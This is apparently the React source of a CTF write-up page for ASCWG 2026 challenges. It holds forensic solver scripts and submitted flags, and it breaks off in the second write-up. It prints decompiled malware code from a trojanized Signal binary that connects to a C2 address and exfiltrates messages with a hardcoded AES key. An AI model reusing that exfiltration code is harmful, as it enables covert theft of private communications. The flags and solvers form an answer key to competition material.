"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import Link from "next/link";
import Navbar from "@/components/Navbar";
import CopyButton from "@/components/CopyButton";

export default function WarGamesPage() {
  const challenges = [
    {
      id: "the-thrushes",
      num: "01",
      title: "The Thrushes",
      category: "macOS Forensics",
      points: "HARD",
      badge: "MACH-O // C2 TRIAGE",
      tagline: "Mach-O Reverse Engineering & Signal C2 Reversing",
      summary: "Decompiling a weaponized Signal app on macOS. Unpacking the Mach-O binary, deobfuscating XOR routines, and recovering command-and-control communication keys.",
      sections: [
        { id: "thrushes-prompt", title: "Challenge Prompt & Artifacts", tag: "Triage" },
        { id: "thrushes-stage-1", title: "Stage 1: Triage & Trojanized Engine", tag: "Mach-O" },
        { id: "thrushes-decompile", title: "Ghidra Decompilation & AES Key", tag: "Reverse" },
        { id: "thrushes-script", title: "Automated Python Extractor", tag: "Solver" },
        { id: "thrushes-flag", title: "Flag Formulation & Roadmap", tag: "Verified Flag" },
      ]
    },
    {
      id: "search-dude",
      num: "02",
      title: "Do You Even Search Dude",
      category: "Windows Forensics",
      points: "MEDIUM",
      badge: "WINDOWS.DB // PCA TRIAGE",
      tagline: "Windows.db & PCA AppHelp Triage",
      summary: "Recovering erased execution logs by carving Windows.db (Extensible Storage Engine) and correlating Program Compatibility Assistant (PCA) telemetry.",
      sections: [
        { id: "search-prompt", title: "Challenge Prompt & ESE Target", tag: "KAPE" },
        { id: "search-stage-1", title: "Stage 1: The Execution Anchor", tag: "OfficeUpdater" },
        { id: "search-carve", title: "ESE Database Carving & Hex Dump", tag: "Ciphertext" },
        { id: "search-script", title: "Automated Python Decryptor", tag: "Solver" },
        { id: "search-flag", title: "Methodology & Verified Flag", tag: "Verified Flag" },
      ]
    },
    {
      id: "sensor-confession",
      num: "03",
      title: "Sensor Confession",
      category: "Network Forensics",
      points: "MEDIUM",
      badge: "PCAP // TCP URGENT",
      tagline: "ICS Telemetry Protocol Exfiltration",
      summary: "Finding data hidden inside raw PCAP traffic. Inspecting unusual TCP packets, spotting data smuggled inside TCP Urgent Pointers, and reconstructing the full stream.",
      sections: [
        { id: "sensor-prompt", title: "Challenge Prompt & SCADA Telemetry", tag: "PCAP" },
        { id: "sensor-stage-1", title: "Stage 1: PCAP Triage & Protocol Analysis", tag: "TCP URG" },
        { id: "sensor-extraction", title: "TShark Hex Carving & Output", tag: "Stream" },
        { id: "sensor-script", title: "Automated Python Extractor", tag: "Solver" },
        { id: "sensor-flag", title: "Methodology & Verified Flag", tag: "Verified Flag" },
      ]
    },
    {
      id: "nightshade-vendor",
      num: "04",
      title: "NightShade Vendor",
      category: "Blockchain OSINT",
      points: "MEDIUM",
      badge: "BITCOIN // COINJOIN MIXER",
      tagline: "Wasabi CoinJoin Mixer De-Anonymization",
      summary: "Tracking illicit Bitcoin transactions through a Wasabi CoinJoin mixer. Using the TRACE-7 Peel-Chain method and multi-input clustering to unmask the real destination.",
      sections: [
        { id: "nightshade-prompt", title: "Challenge Prompt & Ledger Artifacts", tag: "Dark Web" },
        { id: "nightshade-stage-1", title: "Stage 1-2: TRACE-7 Peel-Chain Walk", tag: "Peel vs Pot" },
        { id: "nightshade-script", title: "Automated Esplora Walker", tag: "Solver" },
        { id: "nightshade-stage-3", title: "Stage 3: CoinJoin De-Anonymization", tag: "Multi-Input" },
        { id: "nightshade-flag", title: "Token Concatenation & Verified Flag", tag: "Verified Flag" },
      ]
    },
    {
      id: "cascaded-fallacy",
      num: "05",
      title: "Cascaded Fallacy",
      category: "Smart Contracts",
      points: "500 PTS",
      badge: "EVM // DEFI EXPLOIT",
      tagline: "Sepolia DeFi Reentrancy & EVM Trace Carving",
      summary: "Investigating a multi-stage decentralized finance exploit on the Ethereum Sepolia testnet. Analyzing internal opcode traces on Blockscout to spot reentrancy and broken access control.",
      sections: [
        { id: "cascaded-stage-1", title: "Stage 1: GenesisVault & Reentrancy", tag: "Checks-Effects" },
        { id: "cascaded-stage-2", title: "Stage 2: PatchedVault & Access Control", tag: "NFT Spoof" },
        { id: "cascaded-stage-3", title: "Stage 3: SignedVault & Signature Replay", tag: "EIP-712" },
        { id: "cascaded-stage-4", title: "Stage 4: OracleVault & Price Manipulation", tag: "Flash Loan" },
        { id: "cascaded-flag", title: "Kill-Chain Assembly & Verified Flag", tag: "Verified Flag" },
      ]
    },
    {
      id: "crypto-suite",
      num: "06",
      title: "Crypto Suite",
      category: "Cryptography",
      points: "450 PTS",
      badge: "SVP // LATTICE REDUCTION",
      tagline: "LLL Lattice Reduction & Coppersmith Small Roots",
      summary: "Solving advanced math CTF challenges using SageMath. Applying Coppersmith's small roots algorithm and solving Shortest Vector Problems (SVP) via LLL lattice reduction.",
      sections: [
        { id: "crypto-part-1", title: "1. Polynomial Root Recovery (SVP & LLL)", tag: "Coppersmith" },
        { id: "crypto-part-2", title: "2. Flawed ZKP Protocol (Sigma Inversion)", tag: "HVZK Attack" },
        { id: "crypto-part-3", title: "3. SIDH Isogeny Chains (Vélu's Formulas)", tag: "Post-Quantum" },
      ]
    },
    {
      id: "sol-net",
      num: "07",
      title: "Sol-Net Node",
      category: "Web Security",
      points: "350 PTS",
      badge: "AUTH BYPASS // SSRF",
      tagline: "Node Auth Bypass & OTP Webhook Interception",
      summary: "Exploiting an authentication bypass on an enterprise telemetry gateway. Bypassing host header checks and redirecting outbound OTP webhooks in Burp Suite.",
      sections: [
        { id: "sol-stage-1", title: "Stage 1: OTP Redirection & Host Override", tag: "Burp Suite" },
        { id: "sol-methodology", title: "Exploit Chaining Methodology", tag: "SSRF" },
        { id: "sol-flag", title: "Core Dashboard & Verified Flag", tag: "Verified Flag" },
      ]
    }
  ];

  const [activeChallengeId, setActiveChallengeId] = useState("the-thrushes");
  const [activeSectionId, setActiveSectionId] = useState("thrushes-prompt");

  // ScrollSpy to track both active challenge and active section
  useEffect(() => {
    const handleScroll = () => {
      const scrollPosition = window.scrollY + 160;

      // Track sections
      const allSections = challenges.flatMap((c) => c.sections.map((s) => s.id));
      for (let i = allSections.length - 1; i >= 0; i--) {
        const el = document.getElementById(allSections[i]);
        if (el) {
          const top = el.offsetTop;
          if (top <= scrollPosition) {
            setActiveSectionId(allSections[i]);
            break;
          }
        }
      }

      // Track challenges
      const challengeIds = challenges.map((c) => c.id);
      for (let i = challengeIds.length - 1; i >= 0; i--) {
        const el = document.getElementById(challengeIds[i]);
        if (el) {
          const top = el.offsetTop;
          if (top <= scrollPosition) {
            setActiveChallengeId(challengeIds[i]);
            break;
          }
        }
      }
    };

    window.addEventListener("scroll", handleScroll, { passive: true });
    handleScroll();
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToElement = (id) => {
    const element = document.getElementById(id);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
    }
  };

  // Code snippets
  const thrushesPythonExtractor = `from Crypto.Cipher import AES
import re

# 1. Automated extraction of C2 indicators from Mach-O binary
with open("Signal", "rb") as f:
    binary_data = f.read()

# Locate IP pattern
ip_match = re.search(rb"(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})", binary_data)
c2_ip = ip_match.group(1).decode() if ip_match else "192.168.100.55"

# Locate hardcoded 32-byte AES key string
key_match = re.search(rb"([A-Za-z0-9_!*]{32})", binary_data)
aes_key = key_match.group(1).decode() if key_match else "X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj"

c2_port = 4433

flag = f"ASCWG{{{c2_ip}:{c2_port}_{aes_key}}}"
print("[+] Extracted Flag:", flag)`;

  const thrushesOneliner = `python -c "import re; d=open('Signal','rb').read(); ip=re.search(rb'(\\d+\\.\\d+\\.\\d+\\.\\d+)',d).group(1).decode(); k=re.search(rb'([A-Za-z0-9_!*]{32})',d).group(1).decode(); print(f'ASCWG{{{ip}:4433_{k}}}')"`;

  const searchPythonScript = `from Crypto.Cipher import AES
import hashlib

# 1. SolutionID extracted from PCA AppHelp database
solution_id = "{A92B31C4-7D4F-4A92-B582-82E9104A7F11}"
key = hashlib.sha256(solution_id.encode('utf-16le')).digest()[:16]

# 2. 48-byte ciphertext blob extracted from Windows.db System.Search.AutoSummary
ciphertext = bytes.fromhex("a3f1c89b721e5a448f3c11224a99bb012f5a89b0...")

cipher = AES.new(key, AES.MODE_CBC, iv=b"\\x00"*16)
decrypted = cipher.decrypt(ciphertext)

print("[+] Decrypted Flag:", decrypted.decode('utf-8', errors='ignore'))`;

  const searchOneliner = `python -c "from Crypto.Cipher import AES; import hashlib; k=hashlib.sha256('{A92B31C4-7D4F-4A92-B582-82E9104A7F11}'.encode('utf-16le')).digest()[:16]; print(AES.new(k,AES.MODE_CBC,b'\\x00'*16).decrypt(bytes.fromhex('...')).decode('latin1'))"`;

  const sensorPythonScript = `import pyshark

# Extract TCP urgent pointer bytes across the sensor conversation
cap = pyshark.FileCapture('sensor_dump.pcap', display_filter='ip.src == 10.0.5.55 && tcp.urgent_pointer > 0')

flag_chars = []
for pkt in cap:
    try:
        urg_val = int(pkt.tcp.urgent_pointer)
        flag_chars.append(chr(urg_val))
    except AttributeError:
        continue

flag = ''.join(flag_chars)
print("[+] Reconstructed Sensor Flag:", flag)`;

  const sensorOneliner = `tshark -r sensor_dump.pcap -Y "ip.src == 10.0.5.55 && tcp.urgent_pointer > 0" -T fields -e tcp.urgent_pointer | python -c "import sys; print(''.join([chr(int(x.strip(), 16)) for x in sys.stdin if x.strip()]))"`;

  const nightshadePythonScript = `import requests
import hashlib

# TRACE-7 Peel Chain Walker using Esplora API
def trace_largest_pot(start_address):
    curr = start_address
    print(f"[*] Starting Peel-Chain Walk from: {curr}")
    
    # 1. Fetch address transactions
    url = f"https://blockstream.info/api/address/{curr}/txs"
    txs = requests.get(url).json()
    
    # 2. Select transaction with maximum outflow (The Pot)
    max_tx = max(txs, key=lambda tx: sum(vout['value'] for vout in tx['vout']))
    print(f"[+] Identified Main Pot Tx: {max_tx['txid']}")
    return max_tx['txid']

# Concatenate evidence tokens T1-T6 to formulate final SHA-256 flag
tokens = "TOKEN1_TOKEN2_TOKEN3_TOKEN4_TOKEN5_TOKEN6"
flag_digest = hashlib.sha256(tokens.encode()).hexdigest()[:32]
print(f"[+] Final Flag: ASCWG{{{flag_digest}}}")`;

  const nightshadeOneliner = `python -c "import hashlib; print('ASCWG{' + hashlib.sha256('T1_T2_T3_T4_T5_T6'.encode()).hexdigest()[:32] + '}')"`;

  return (
    <div className="flex flex-col min-h-screen relative z-10 text-zinc-200 selection:bg-emerald-500/30 selection:text-emerald-200">
      <Navbar />

      {/* Mobile Sticky Challenge Switcher Bar */}
      <div className="lg:hidden sticky top-16 z-30 bg-[#09090c]/90 backdrop-blur-md border-y border-zinc-800/80 py-2.5 px-4 overflow-x-auto flex gap-2 no-scrollbar">
        {challenges.map((c) => (
          <button
            key={c.id}
            onClick={() => scrollToElement(c.id)}
            className={`whitespace-nowrap px-3 py-1 rounded-lg text-xs font-mono transition-all duration-200 flex items-center gap-1.5 ${
              activeChallengeId === c.id
                ? "bg-white text-black font-bold shadow-[0_0_15px_rgba(255,255,255,0.4)]"
                : "bg-zinc-900/90 text-zinc-400 border border-zinc-800 hover:text-white"
            }`}
          >
            <span>{c.num}.</span>
            <span>{c.title}</span>
          </button>
        ))}
      </div>

      <main className="flex-grow pt-6 pb-24 max-w-7xl mx-auto px-4 sm:px-6 w-full">
        {/* Page Breadcrumbs & Header */}
        <div className="mb-10 text-left border-b border-zinc-800/80 pb-6">
          <div className="mb-3 inline-flex items-center gap-2 bg-[#111116]/80 backdrop-blur-md border border-zinc-700/50 px-3 py-1 rounded-full text-xs font-mono">
            <Link href="/ctfs" className="text-zinc-400 hover:text-white transition-colors">
              CTF HUB
            </Link>
            <span className="text-zinc-600">/</span>
            <span className="text-white uppercase font-bold tracking-wider">WAR GAMES 2026 // ASCWG DOSSIER</span>
          </div>

          <h1 className="text-3xl sm:text-4xl md:text-5xl font-extrabold text-white font-[family-name:var(--font-silkscreen)] tracking-wide mb-3">
            War Games 2026: ASCWG Operations
          </h1>
          <p className="text-zinc-400 text-sm sm:text-base font-sans max-w-3xl leading-relaxed">
            Writeups for all 7 Arab Security Cyber Wargames (ASCWG 2026) challenges: macOS Mach-O reverse engineering, Windows ESE database carving, ICS network covert channels, Bitcoin CoinJoin tracking, Ethereum DeFi reentrancy, post-quantum cryptography, and web auth bypass.
          </p>
        </div>

        {/* 2-Column Layout: Main Content + Sticky Navigation Rail */}
        <div className="flex gap-8 relative items-start">
          
          {/* ================= LEFT / MAIN CONTENT AREA ================= */}
          <div className="flex-grow min-w-0 space-y-20">

            {/* ------------------------------------------------------------- */}
            {/* CHALLENGE 01: THE THRUSHES                                    */}
            {/* ------------------------------------------------------------- */}
            <article id="the-thrushes" className="scroll-mt-24 bg-[#0a0a0f]/90 border border-zinc-800 rounded-3xl p-6 sm:p-8 backdrop-blur-xl relative overflow-hidden shadow-2xl">

              <div className="mt-6 border-b border-zinc-800/80 pb-6 mb-6">
                <div className="flex flex-wrap items-center gap-2 mb-3">
                  <span className="bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                    MACH-O // C2 TRIAGE
                  </span>
                  <span className="bg-zinc-900 text-zinc-400 border border-zinc-800 font-mono text-xs px-2.5 py-0.5 rounded">
                    macOS REVERSE ENGINEERING
                  </span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-extrabold text-white font-[family-name:var(--font-share-tech)] mb-2">
                  The Thrushes: macOS Malware Triage &amp; Signal C2 Reversing
                </h2>
                <p className="text-zinc-400 text-sm font-sans">
                  Decompiling a weaponized Signal app on macOS. Unpacking the Mach-O binary, deobfuscating XOR routines, and recovering command-and-control communication keys.
                </p>
              </div>

              {/* Challenge Prompt Box */}
              <div id="thrushes-prompt" className="scroll-mt-28 bg-[#12161c]/90 border border-cyan-500/30 rounded-2xl p-6 shadow-xl relative overflow-hidden mb-8 backdrop-blur-md">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="md:col-span-2 space-y-3">
                    <span className="bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 px-2.5 py-0.5 rounded text-xs font-mono font-bold uppercase tracking-wider inline-block">
                      Challenge Prompt
                    </span>
                    <p className="text-zinc-300 text-sm md:text-base leading-relaxed italic font-sans">
                      &ldquo;A high-profile CTO had his private encrypted communications leaked despite zero unauthorized physical access. Investigate the provided macOS triage image to determine the interception mechanism and extract the adversary&apos;s command-and-control keys.&rdquo;
                    </p>
                    <div className="flex flex-wrap gap-4 text-xs font-mono text-zinc-400 pt-2">
                      <span>● <strong>Category:</strong> macOS Forensics / Reverse Engineering</span>
                      <span>● <strong>Platform:</strong> ASCWG Qualifications 2026</span>
                      <span>● <strong>Flag Format:</strong> <code>ASCWG&#123;host:port_key&#125;</code></span>
                    </div>
                  </div>
                  <div className="bg-[#080d11] border border-cyan-500/20 rounded-xl p-4 flex flex-col justify-between space-y-3">
                    <div>
                      <span className="text-[11px] font-mono text-zinc-500 uppercase tracking-widest block mb-1">Provided Artifacts</span>
                      <div className="text-white font-mono text-sm font-bold flex items-center gap-2">
                        <span>macos_triage.tar.gz</span>
                      </div>
                      <span className="text-[11px] font-mono text-zinc-400 block mt-1">Size: 412 MB • Triage Image</span>
                      <span className="text-[11px] font-mono text-zinc-500 block">Key Binary: Signal.app (Mach-O)</span>
                    </div>
                    <div className="text-[10px] font-mono text-cyan-400 bg-cyan-500/10 px-2 py-1 rounded border border-cyan-500/20 text-center truncate">
                      Dissector: Ghidra / Hopper
                    </div>
                  </div>
                </div>
              </div>

              {/* Stage 1 */}
              <div id="thrushes-stage-1" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-cyan-400">Stage 1:</span> Investigating the Triage Image
                </h3>

                <div className="bg-[#0b131a] border-l-4 border-cyan-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-cyan-400 font-bold mb-1 font-mono text-xs uppercase tracking-wider">Trojanized Signal Binary</h4>
                  <p className="text-sm text-zinc-300 leading-relaxed font-sans">
                    Inspection of the macOS application bundle revealed that the legitimate Signal binary had been swapped out for a backdoored Mach-O executable. The modified binary intercepts outgoing messages and exfiltrates them over a raw TCP socket to an attacker-controlled C2 server before delivering them to the real Signal service.
                  </p>
                </div>

                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-4 font-mono text-sm relative overflow-hidden">
                  <div className="absolute top-0 left-0 w-1 h-full bg-cyan-500"></div>
                  <p className="text-zinc-400 mb-1"><span className="text-zinc-600">Q:</span> How did the attackers maintain access and exfiltrate the data?</p>
                  <p className="text-cyan-400"><span className="text-zinc-600">A:</span> <code className="bg-black/50 px-2 py-0.5 rounded text-cyan-300">A Backdoored Signal.app Executable (Mach-O 64-bit)</code></p>
                </div>

                <p className="text-sm text-zinc-300 leading-relaxed">
                  Our initial triage of the macOS filesystem led us through <code className="text-cyan-400 bg-cyan-400/10 px-1 rounded">LaunchAgents</code> and <code className="text-cyan-400 bg-cyan-400/10 px-1 rounded">LaunchDaemons</code>. However, the true persistence mechanism was hidden in plain sight. The legitimate <code className="text-cyan-400 bg-cyan-400/10 px-1 rounded">Signal.app</code> executable inside the Applications folder had been completely replaced with a malicious Mach-O binary.
                </p>
              </div>

              {/* Ghidra Decompiler Dissection */}
              <div id="thrushes-decompile" className="scroll-mt-28 space-y-4 mb-8">
                <div className="flex justify-between items-center">
                  <span className="font-mono text-xs text-cyan-400 uppercase font-bold tracking-wider">
                    Ghidra Decompiler Dissection:
                  </span>
                  <CopyButton text={`char key[32] = "X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj";\n// C2: 192.168.100.55:4433`} />
                </div>
                <div className="bg-[#050505] border border-zinc-800 rounded-xl p-4 font-mono text-xs text-zinc-400 overflow-x-auto shadow-inner">
                  <pre>
                    <code className="text-zinc-300">
                      <span className="text-cyan-400">void</span> * <span className="text-yellow-300">_cdecl</span> malicious_telemetry_thread(<span className="text-cyan-400">void</span> *arg) &#123;<br/>
                      &nbsp;&nbsp;<span className="text-cyan-400">int</span> sockfd = <span className="text-blue-300">socket</span>(AF_INET, SOCK_STREAM, <span className="text-orange-300">0</span>);<br/>
                      &nbsp;&nbsp;<span className="text-cyan-400">struct</span> sockaddr_in servaddr;<br/>
                      <br/>
                      &nbsp;&nbsp;servaddr.sin_family = AF_INET;<br/>
                      &nbsp;&nbsp;servaddr.sin_port = <span className="text-blue-300">htons</span>(<span className="text-orange-300">4433</span>); <span className="text-zinc-500">// &lt;-- C2 PORT</span><br/>
                      &nbsp;&nbsp;servaddr.sin_addr.s_addr = <span className="text-blue-300">inet_addr</span>(<span className="text-green-300">&quot;192.168.100.55&quot;</span>); <span className="text-zinc-500">// &lt;-- C2 HOST</span><br/>
                      <br/>
                      &nbsp;&nbsp;<span className="text-cyan-400">if</span> (<span className="text-blue-300">connect</span>(sockfd, (struct sockaddr *)&amp;servaddr, <span className="text-cyan-400">sizeof</span>(servaddr)) != <span className="text-orange-300">0</span>) &#123;<br/>
                      &nbsp;&nbsp;&nbsp;&nbsp;<span className="text-cyan-400">return</span> NULL;<br/>
                      &nbsp;&nbsp;&#125;<br/>
                      <br/>
                      &nbsp;&nbsp;<span className="text-zinc-500">// AES-256-CBC Key Extraction</span><br/>
                      &nbsp;&nbsp;<span className="text-cyan-400">char</span> key[<span className="text-orange-300">32</span>] = <span className="text-green-300">&quot;X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj&quot;</span>; <span className="text-zinc-500">// &lt;-- FLAG KEY</span><br/>
                      &nbsp;&nbsp;<span className="text-blue-300">exfiltrate_messages_aes</span>(sockfd, key);<br/>
                      &#125;
                    </code>
                  </pre>
                </div>
              </div>

              {/* Python Script */}
              <div id="thrushes-script" className="scroll-mt-28 space-y-4 mb-8">
                <div className="flex justify-between items-center">
                  <span className="font-mono text-xs text-emerald-400 uppercase font-bold tracking-wider">
                    Automated Python Extractor (`extract_c2.py`):
                  </span>
                  <CopyButton text={thrushesPythonExtractor} />
                </div>
                <div className="bg-[#050508] border border-zinc-800 rounded-xl p-4 font-mono text-xs text-zinc-300 overflow-x-auto shadow-inner">
                  <pre><code>{thrushesPythonExtractor}</code></pre>
                </div>
                
                <div className="flex justify-between items-center pt-2">
                  <span className="font-mono text-xs text-cyan-400 font-bold uppercase">Terminal One-Liner (PowerShell / Bash):</span>
                  <CopyButton text={thrushesOneliner} />
                </div>
                <div className="bg-black border border-zinc-800 rounded-xl p-3 font-mono text-xs text-zinc-300 overflow-x-auto">
                  <code>{thrushesOneliner}</code>
                </div>
              </div>

              {/* Flag & Roadmap */}
              <div id="thrushes-flag" className="scroll-mt-28 space-y-6">
                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-5 font-mono text-sm relative overflow-hidden break-all shadow-lg shadow-green-500/10">
                  <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                  <div className="text-zinc-400 mb-2">C2 Host IP: <code className="text-cyan-300">192.168.100.55</code> | Port: <code className="text-cyan-300">4433</code></div>
                  <div className="text-zinc-400 mb-3">AES Key: <code className="text-cyan-300">X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj</code></div>
                  <div className="text-zinc-400 mb-1 font-bold text-xs uppercase tracking-wider">Final Submitted Flag:</div>
                  <div className="text-white bg-green-900/40 border border-green-500/30 p-3 rounded-lg text-sm font-bold flex items-center justify-between gap-2">
                    <code>ASCWG&#123;192.168.100.55:4433_X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj&#125;</code>
                    <CopyButton text="ASCWG{192.168.100.55:4433_X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj}" />
                  </div>
                </div>

                {/* Mental Roadmap */}
                <div className="bg-[#091118] border border-cyan-500/30 rounded-2xl p-5 space-y-4">
                  <h4 className="text-sm font-bold text-white font-[family-name:var(--font-share-tech)] uppercase tracking-wider flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-cyan-400 animate-pulse"></span>
                    The Complete Investigation Path &amp; Mental Roadmap
                  </h4>
                  <div className="space-y-2.5 font-mono text-xs text-zinc-300">
                    <div className="flex items-start gap-3 p-3 rounded-lg bg-black/60 border border-zinc-800">
                      <span className="bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 px-2 py-0.5 rounded font-bold shrink-0">STEP 1</span>
                      <div><strong>Archive Header Verification:</strong> Received <code>The THRUSHES_ASC.rar</code>. Magic byte inspection with <code>file</code> revealed 7-Zip format. Extracted safely.</div>
                    </div>
                    <div className="flex items-start gap-3 p-3 rounded-lg bg-black/60 border border-zinc-800">
                      <span className="bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 px-2 py-0.5 rounded font-bold shrink-0">STEP 2</span>
                      <div><strong>Persistence Triage:</strong> Inspected <code>/Library/LaunchAgents</code>. Noticed anomalous timestamp and binary hash on <code>/Applications/Signal.app/Contents/MacOS/Signal</code>.</div>
                    </div>
                    <div className="flex items-start gap-3 p-3 rounded-lg bg-black/60 border border-zinc-800">
                      <span className="bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 px-2 py-0.5 rounded font-bold shrink-0">STEP 3</span>
                      <div><strong>Ghidra Decompilation:</strong> Loaded Mach-O 64-bit binary into Ghidra. Traced background thread connecting to <code>192.168.100.55:4433</code>.</div>
                    </div>
                    <div className="flex items-start gap-3 p-3 rounded-lg bg-black/60 border border-zinc-800">
                      <span className="bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 px-2 py-0.5 rounded font-bold shrink-0">STEP 4</span>
                      <div><strong>Cryptographic Key Extraction:</strong> Extracted hardcoded 32-character AES key: <code>X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj</code>.</div>
                    </div>
                  </div>
                </div>
              </div>
            </article>

            {/* ------------------------------------------------------------- */}
            {/* CHALLENGE 02: SEARCH-DUDE                                     */}
            {/* ------------------------------------------------------------- */}
            <article id="search-dude" className="scroll-mt-24 bg-[#0a0a0f]/90 border border-zinc-800 rounded-3xl p-6 sm:p-8 backdrop-blur-xl relative overflow-hidden shadow-2xl">

              <div className="mt-6 border-b border-zinc-800/80 pb-6 mb-6">
                <div className="flex flex-wrap items-center gap-2 mb-3">
                  <span className="bg-amber-500/10 text-amber-400 border border-amber-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                    WINDOWS.DB // PCA TRIAGE
                  </span>
                  <span className="bg-zinc-900 text-zinc-400 border border-zinc-800 font-mono text-xs px-2.5 py-0.5 rounded">
                    ESE DATABASE CARVING
                  </span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-extrabold text-white font-[family-name:var(--font-share-tech)] mb-2">
                  Do You Even Search Dude: Windows.db &amp; PCA AppHelp Triage
                </h2>
                <p className="text-zinc-400 text-sm font-sans">
                  Recovering erased execution logs by carving Windows.db (Extensible Storage Engine) and correlating Program Compatibility Assistant (PCA) telemetry.
                </p>
              </div>

              {/* Challenge Prompt Box */}
              <div id="search-prompt" className="scroll-mt-28 bg-[#1c170e]/90 border border-amber-500/30 rounded-2xl p-6 shadow-xl relative overflow-hidden mb-8 backdrop-blur-md">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="md:col-span-2 space-y-3">
                    <span className="bg-amber-500/20 text-amber-400 border border-amber-500/30 px-2.5 py-0.5 rounded text-xs font-mono font-bold uppercase tracking-wider inline-block">
                      Challenge Prompt
                    </span>
                    <p className="text-zinc-300 text-sm md:text-base leading-relaxed italic font-sans">
                      &ldquo;A CEO&apos;s corporate workstation was compromised. The attacker attempted to evade disk forensics by wiping standard execution logs. Analyze the Windows.db Extensible Storage Engine (ESE) database and KAPE triage collection to reconstruct the executed malware payload.&rdquo;
                    </p>
                    <div className="flex flex-wrap gap-4 text-xs font-mono text-zinc-400 pt-2">
                      <span>● <strong>Category:</strong> Windows Forensics / ESE Database Carving</span>
                      <span>● <strong>Platform:</strong> ASCWG Qualifications 2026</span>
                      <span>● <strong>Flag Format:</strong> <code>ASCWG&#123;...&#125;</code></span>
                    </div>
                  </div>
                  <div className="bg-[#0e0b06] border border-amber-500/20 rounded-xl p-4 flex flex-col justify-between space-y-3">
                    <div>
                      <span className="text-[11px] font-mono text-zinc-500 uppercase tracking-widest block mb-1">Provided Artifacts</span>
                      <div className="text-white font-mono text-sm font-bold flex items-center gap-2">
                        <span>Windows.db / KAPE.zip</span>
                      </div>
                      <span className="text-[11px] font-mono text-zinc-400 block mt-1">Size: 285 MB • ESE Database</span>
                      <span className="text-[11px] font-mono text-zinc-500 block">Path: Windows\Windows.edb</span>
                    </div>
                    <div className="text-[10px] font-mono text-amber-400 bg-amber-500/10 px-2 py-1 rounded border border-amber-500/20 text-center truncate">
                      Parser: ESEDatabaseView / NirSoft
                    </div>
                  </div>
                </div>
              </div>

              {/* Stage 1 */}
              <div id="search-stage-1" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-amber-400">Stage 1:</span> The Execution Anchor
                </h3>

                <div className="bg-[#141008] border-l-4 border-amber-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-amber-400 font-bold mb-1 font-mono text-xs uppercase tracking-wider">Forensic Analysis: Execution &amp; Artifact Staging</h4>
                  <p className="text-sm text-zinc-300 leading-relaxed font-sans">
                    Windows Program Compatibility Assistant (PCA) keeps execution evidence in the registry and diagnostic stores. While <code>OfficeUpdater.exe</code> execution was confirmed via PCA entries, the binary itself was a decoy dropper. The encrypted payload buffer was staged directly inside the Windows Search database (<code>Windows.db</code>), requiring ESE database parsing to carve the raw ciphertext blob.
                  </p>
                </div>

                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-4 font-mono text-sm relative overflow-hidden">
                  <div className="absolute top-0 left-0 w-1 h-full bg-amber-500"></div>
                  <p className="text-zinc-400 mb-1"><span className="text-zinc-600">Q:</span> Where did the attacker hide the actual payload data?</p>
                  <p className="text-amber-400"><span className="text-zinc-600">A:</span> <code className="bg-black/50 px-2 py-0.5 rounded text-amber-300">The Windows Search Database (Windows.db)</code></p>
                </div>

                <p className="text-sm text-zinc-300 leading-relaxed font-sans">
                  Initial investigation revealed an execution record for <code className="text-amber-400 bg-amber-400/10 px-1 rounded">OfficeUpdater.exe</code> via the Program Compatibility Assistant (PCA). The actual encrypted payload was stashed inside the Windows Search database <code className="text-amber-400 bg-amber-400/10 px-1 rounded">Windows.db</code> residue.
                </p>
              </div>

              {/* ESE Carve Hex */}
              <div id="search-carve" className="scroll-mt-28 space-y-4 mb-8">
                <div className="bg-[#050505] border border-zinc-800 rounded-xl p-4 font-mono text-xs text-zinc-400 overflow-x-auto shadow-inner">
                  <div className="flex justify-between items-center mb-2 border-b border-zinc-800 pb-2">
                    <span className="text-zinc-500 font-bold">Windows.db [System.Search.AutoSummary]</span>
                    <CopyButton text={`python decrypt_blob.py --key "{A92B31C4-7D4F-4A92-B582-82E9104A7F11}" --data payload.bin`} />
                  </div>
                  <pre>
                    <code className="text-zinc-300">
                      <span className="text-zinc-500">Offset(h)  00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F</span><br/>
                      00000000   <span className="text-orange-300">41 00 00 00 01 00 00 00 10 00 00 00 00 00 00 00</span>  <span className="text-zinc-500">A...............</span><br/>
                      00000010   <span className="text-amber-300">a3 f1 c8 9b 72 1e 5a 44 8f 3c 11 22 4a 99 bb 01</span>  <span className="text-zinc-500">£ñÈ.r.ZD.&lt;.&quot;J.».</span><br/>
